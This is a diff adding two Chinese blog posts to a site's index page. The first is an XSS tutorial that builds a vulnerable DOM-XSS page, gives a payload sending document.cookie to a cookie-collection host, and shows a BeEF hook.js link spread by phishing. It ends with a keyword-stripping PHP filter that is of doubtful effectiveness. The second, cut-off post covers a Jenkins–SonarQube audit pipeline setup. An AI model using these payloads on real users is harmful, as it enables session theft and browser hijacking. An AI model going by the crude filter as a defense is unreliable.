@@ -433,6 +433,450 @@ window.onmouseout = function () {
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/24/web安全之XSS漏洞学习实战/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Darren-zl">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Darren-学无止境">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/24/web安全之XSS漏洞学习实战/" itemprop="url">Untitled</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-24T14:57:52+08:00">
+                2020-03-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-comment-o"></i>
+              </span>
+              
+                <a href="/2020/03/24/web安全之XSS漏洞学习实战/#SOHUCS" itemprop="discussionUrl">
+                  <span id="url::http://yoursite.com/2020/03/24/web安全之XSS漏洞学习实战/" class="cy_cmt_count" data-xid="2020/03/24/web安全之XSS漏洞学习实战/" itemprop="commentsCount"></span>
+                </a>
+              
+            
+          
+
+          
+          
+             <span id="/2020/03/24/web安全之XSS漏洞学习实战/" class="leancloud_visitors" data-flag-title>
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </span></div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+      
+      
+
+      
+        
+          
+            <h2 id="web安全之XSS漏洞学习实战"><a href="#web安全之XSS漏洞学习实战" class="headerlink" title="web安全之XSS漏洞学习实战"></a>web安全之XSS漏洞学习实战</h2><h3 id="1-编写一个存在XSS漏洞的页面"><a href="#1-编写一个存在XSS漏洞的页面" class="headerlink" title="1.编写一个存在XSS漏洞的页面"></a>1.编写一个存在XSS漏洞的页面</h3><p>编写一个dom形xss。首先html页面：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>DOMXSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">H2</span>&gt;</span>DOMXSS<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> pos=<span class="built_in">document</span>.URL.indexOf(<span class="string">"name="</span>)+<span class="number">5</span>;</span></span><br><span class="line"><span class="javascript">	<span class="built_in">document</span>.write(<span class="built_in">decodeURI</span>(<span class="built_in">document</span>.URL.substring(pos,<span class="built_in">document</span>.URL.length))); </span></span><br><span class="line"><span class="javascript"><span class="comment">//1.document.URL表示返回当前页面的URL   2.indexOf表示回某个指定的字符串值在字符串中首次出现的位置。   pos=74(url长度)+5</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//1.document.write表示输出内容  2.decodeURI() 函数可对 encodeURI() 函数编码过的 URI 进行解码，decodeURI为解码。 </span></span></span><br><span class="line"><span class="javascript"><span class="comment">//3.substring() 方法用于提取字符串中介于两个指定下标之间的字符。substring() 方法返回的子串包括 开始 处的字符，但不包括 结束 处的字符。</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>验证：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578539018013.png" alt="1578539018013"></p>
+<h3 id="2-利用XSS"><a href="#2-利用XSS" class="headerlink" title="2.利用XSS"></a>2.利用XSS</h3><p>存在xss漏洞的页面上只需</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>便可以获取到当前用户的cookie。</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578540177735.png" alt="1578540177735"></p>
+<p>如果对方漏洞为存储型XSS，并且你搭建了xss获取cookie的平台那么只需将下面代码插入漏洞页面中，便可以在cookie平台中获取到对方的cookie。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(<span class="string">'http://xss/cookie.asp?msg='</span>+<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-利用XSS漏洞还可以做什么。"><a href="#3-利用XSS漏洞还可以做什么。" class="headerlink" title="3.利用XSS漏洞还可以做什么。"></a>3.利用XSS漏洞还可以做什么。</h3><p>3.1 可以在beef上把目标的浏览器作为代理进行操作，可以进行DNS污染等等。</p>
+<p>3.2 可以利用mitmf结合社会工程学使用户接受Social Engineering中的模块，让用户安装.exe等更新软件获取shell。</p>
+<p>3.3 结合metasploit进一步获取权限。</p>
+<p>首先在Beef里构造一个存在漏洞的页面，如下：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578540339135.png" alt="1578540339135"></p>
+<p>然后利用邮件钓鱼等多种方式诱导用户访问含有XSS漏洞页面：</p>
+<p>如： <a href="http://127.0.0.1/domxss.html?name=" target="_blank" rel="noopener">http://127.0.0.1/domxss.html?name=</a><script src="http://192.168.5.54:3000/hook.js"></script></p>
+<p>用户点击以后便直接上线：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578540669070.png" alt="1578540669070"></p>
+<p>然后就可以做很多事件：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1578540698882.png" alt="1578540698882"></p>
+<h3 id="4-如何防御XSS"><a href="#4-如何防御XSS" class="headerlink" title="4.如何防御XSS"></a>4.如何防御XSS</h3><p>xss的防御主要还是集中在代码层，需要过滤非法字符。需要对输入内容进行过滤，输出内容进行编码。</p>
+<p>针对php可以用如下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($str)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    $str = htmlspecialchars($str);</span><br><span class="line">    $str = str_replace( <span class="string">'/'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'"'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'('</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">')'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'CR'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'ASCII'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'ASCII 0x0d'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'LF'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'ASCII 0x0a'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">','</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'%'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">';'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'eval'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'open'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'sysopen'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'system'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'$'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">"'"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">"'"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'ASCII 0x08'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'"'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace( <span class="string">'"'</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">""</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;gt"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;lt"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;SCRIPT&gt;"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;/SCRIPT&gt;"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;script&gt;"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;/script&gt;"</span>, <span class="string">""</span>, $str);</span><br><span class="line">    $str = str_replace(<span class="string">"select"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"join"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"union"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"where"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"insert"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"delete"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"update"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"like"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"drop"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"DROP"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"create"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"modify"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"rename"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"alter"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"cas"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">" "</span>,chr(<span class="number">32</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">" "</span>,chr(<span class="number">9</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"    "</span>,chr(<span class="number">9</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;"</span>,chr(<span class="number">34</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"'"</span>,chr(<span class="number">39</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;br /&gt;"</span>,chr(<span class="number">13</span>),$str);</span><br><span class="line">    $str = str_replace(<span class="string">"''"</span>,<span class="string">"'"</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"css"</span>,<span class="string">"'"</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"CSS"</span>,<span class="string">"'"</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&lt;!--"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"convert"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"md5"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"passwd"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"password"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"../"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"./"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"Array"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"or 1='1'"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">";set|set&amp;set;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"`set|set&amp;set`"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"--"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"OR"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">'"'</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"*"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"-"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"+"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"/"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"="</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"'/"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"-- "</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">" -- "</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">" --"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"("</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">")"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&#123;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&#125;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"-1"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"1"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"."</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"response"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"write"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"|"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"`"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">";"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"etc"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"root"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"//"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"!="</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"$"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"&amp;&amp;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"=="</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"#"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"@"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"mailto:"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"CHAR"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    $str = str_replace(<span class="string">"char"</span>,<span class="string">""</span>,$str);</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将非法字符都过滤掉可以一定程度上防止XSS也可以防止SQL注入。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+
+
+    
+
+    
+
+    
+
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/24/基于Gitlab+jenkins+Sonarqube+Grafana自动化代码审计平台搭建/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Darren-zl">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Darren-学无止境">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/03/24/基于Gitlab+jenkins+Sonarqube+Grafana自动化代码审计平台搭建/" itemprop="url">基于Gitlab+jenkins+Sonarqube+Grafana自动化代码审计平台搭建</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-24T10:55:34+08:00">
+                2020-03-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-comment-o"></i>
+              </span>
+              
+                <a href="/2020/03/24/基于Gitlab+jenkins+Sonarqube+Grafana自动化代码审计平台搭建/#SOHUCS" itemprop="discussionUrl">
+                  <span id="url::http://yoursite.com/2020/03/24/基于Gitlab+jenkins+Sonarqube+Grafana自动化代码审计平台搭建/" class="cy_cmt_count" data-xid="2020/03/24/基于Gitlab+jenkins+Sonarqube+Grafana自动化代码审计平台搭建/" itemprop="commentsCount"></span>
+                </a>
+              
+            
+          
+
+          
+          
+             <span id="/2020/03/24/基于Gitlab+jenkins+Sonarqube+Grafana自动化代码审计平台搭建/" class="leancloud_visitors" data-flag-title="基于Gitlab+jenkins+Sonarqube+Grafana自动化代码审计平台搭建">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </span></div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+      
+      
+
+      
+        
+          
+            <h2 id="基于Gitlab-jenkins-Sonarqube-Grafana自动化代码审计平台搭建"><a href="#基于Gitlab-jenkins-Sonarqube-Grafana自动化代码审计平台搭建" class="headerlink" title="基于Gitlab+jenkins+Sonarqube+Grafana自动化代码审计平台搭建"></a>基于Gitlab+jenkins+Sonarqube+Grafana自动化代码审计平台搭建</h2><h5 id="背景：针对项目代码质量管理，在目前的微服务-模块化-快迭代的敏捷开发中。如果仅依赖IDE简单检查和人为的代码审查，对于大量代码很不适合。所以对于高效优异的代码，不仅仅依靠开发人员的对于代码编写的规范，同时也需要一些工具来帮助我们提前预防和强制检测代码规范。由此便产生了基于Gitlab-Jenkins-Sonarqube-Grafana的自动化代码审计监控平台。（PS：就是公司有这个需求）"><a href="#背景：针对项目代码质量管理，在目前的微服务-模块化-快迭代的敏捷开发中。如果仅依赖IDE简单检查和人为的代码审查，对于大量代码很不适合。所以对于高效优异的代码，不仅仅依靠开发人员的对于代码编写的规范，同时也需要一些工具来帮助我们提前预防和强制检测代码规范。由此便产生了基于Gitlab-Jenkins-Sonarqube-Grafana的自动化代码审计监控平台。（PS：就是公司有这个需求）" class="headerlink" title="背景：针对项目代码质量管理，在目前的微服务/模块化/快迭代的敏捷开发中。如果仅依赖IDE简单检查和人为的代码审查，对于大量代码很不适合。所以对于高效优异的代码，不仅仅依靠开发人员的对于代码编写的规范，同时也需要一些工具来帮助我们提前预防和强制检测代码规范。由此便产生了基于Gitlab+Jenkins+Sonarqube+Grafana的自动化代码审计监控平台。（PS：就是公司有这个需求）"></a>背景：针对项目代码质量管理，在目前的微服务/模块化/快迭代的敏捷开发中。如果仅依赖IDE简单检查和人为的代码审查，对于大量代码很不适合。所以对于高效优异的代码，不仅仅依靠开发人员的对于代码编写的规范，同时也需要一些工具来帮助我们提前预防和强制检测代码规范。由此便产生了基于Gitlab+Jenkins+Sonarqube+Grafana的自动化代码审计监控平台。（PS：就是公司有这个需求）</h5><h4 id="1-项目架构："><a href="#1-项目架构：" class="headerlink" title="1.项目架构："></a>1.项目架构：</h4><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200320135117408.png" alt="image-20200320135117408"></p>
+<h4 id="2-环境以及准备"><a href="#2-环境以及准备" class="headerlink" title="2.环境以及准备:"></a>2.环境以及准备:</h4><table>
+<thead>
+<tr>
+<th>软件或插件名称</th>
+<th>版本号</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Gitlab</td>
+<td>v11.0.2</td>
+<td></td>
+</tr>
+<tr>
+<td>Jenkins</td>
+<td>v2.144</td>
+<td></td>
+</tr>
+<tr>
+<td>Sonarqube</td>
+<td>v7.9.2</td>
+<td></td>
+</tr>
+<tr>
+<td>Grafana</td>
+<td>v6.6.2</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>针对Gitlab与jenkins通过Webhook进行自动触发构建的相关内容配置我这边不进行叙述了，网上这方面文章很多，我会着重讲后面内容。</p>
+<h4 id="3-Jenkins与Sonarqube联动"><a href="#3-Jenkins与Sonarqube联动" class="headerlink" title="3.Jenkins与Sonarqube联动:"></a>3.Jenkins与Sonarqube联动:</h4><h5 id="3-1首先需要在Sonarqube里面生成一个Sonarqube的令牌，用来给Jenkins使用。在如下地方设置："><a href="#3-1首先需要在Sonarqube里面生成一个Sonarqube的令牌，用来给Jenkins使用。在如下地方设置：" class="headerlink" title="3.1首先需要在Sonarqube里面生成一个Sonarqube的令牌，用来给Jenkins使用。在如下地方设置："></a>3.1首先需要在Sonarqube里面生成一个Sonarqube的令牌，用来给Jenkins使用。在如下地方设置：</h5><p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200320143031931.png" alt="image-20200320143031931"></p>
+<h5 id="3-2-在jenkins上部署，SonarQube-Scanner-扫描插件："><a href="#3-2-在jenkins上部署，SonarQube-Scanner-扫描插件：" class="headerlink" title="3.2 在jenkins上部署，SonarQube Scanner 扫描插件："></a>3.2 在jenkins上部署，SonarQube Scanner 扫描插件：</h5><p>在jenkins中安装插件：SonarQube Scanner for jenkins，如下：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200320143445564.png" alt="image-20200320143445564"></p>
+<p>网页登录jenkins,在Manage Jenkins—-Global Tool Conﬁguration—-SonarQube Scanner模块中配置 如下设置：</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200320143510707.png" alt="image-20200320143510707"></p>
+<p>添加Sonarqube凭证，在凭据-系统中添加全局凭据，类型为Secret text并添加如下token（3.1中的token）。</p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200320143538518.png" alt="image-20200320143538518"></p>
+<p>然后在Manage Jenkins—conﬁguration模块下面Sonarqube servers中如下添加： </p>
+<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/image-20200320143607417.png" alt="image-20200320143607417"></p>
+<p>然后在job构建中添加如下信息：</p>
